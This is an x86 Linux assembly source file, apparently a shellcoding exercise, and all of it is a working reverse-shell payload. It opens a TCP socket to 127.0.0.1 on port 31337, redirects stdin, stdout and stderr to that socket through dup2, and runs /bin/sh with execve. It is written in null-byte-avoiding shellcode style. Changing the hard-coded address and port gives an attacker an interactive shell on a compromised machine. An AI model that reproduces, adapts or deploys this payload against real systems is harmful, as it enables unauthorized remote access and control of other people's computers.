global _start           

section .text

_start:
    ; s = socket(2, 1, 0)
    push BYTE 0x66  ; socketcall (syscall 102)
    pop eax
    cdq             ; zero out edx
    xor ebx, ebx 
    inc ebx         ; ebx=1 SYS_SOCKET
    push edx        ; Build arg array: { protocol = 0,(in reverse) SOCK_STREAM = 1,AF_INET = 2 }
    push 0x1 
    push 0x2 
    mov ecx, esp 
    int 0x80

    xchg esi, eax   ; save sockfd in esi

    ; connect(sockfd, (struct sockaddr *)&serv_addr, sizeof(serv_addr));
    push BYTE 0x66  ; socketcall (syscall 102)
    pop eax
    inc ebx
    push DWORD 0x0100007F     ; ip = 127.0.0.1
    push WORD 0x697a    ; port = 31337
    push WORD bx        ; AF_INET   
    inc ebx             ; connect() -> 3
    mov ecx, esp        ; point to the structure
    push 0x10           ; sizeof(struct sockaddr_in)
    push ecx            ; &serv_addr
    push esi            ; sockfd
    mov ecx, esp        ; load address of the parameter array
    int 0x80            ; call socketcall()

    ; dup2()
    push BYTE 0x2
    pop ecx
loop:
    mov al, 0x3f    
    int 0x80
    dec ecx
    jns loop

    ; execve(const char *filename, char *const argv [], char *const envp[])
    mov BYTE al, 0xb    ; execve (syscall 11)
    cdq                 ; zero out edx
    xor ecx, ecx
    push edx            ; push null bytes (terminate string)
    push 0x68732f2f     ; push "//sh"
    push 0x6e69622f     ; push "/bin"
    mov ebx, esp        ; load address of /bin/sh
    int 0x80            ; call execve()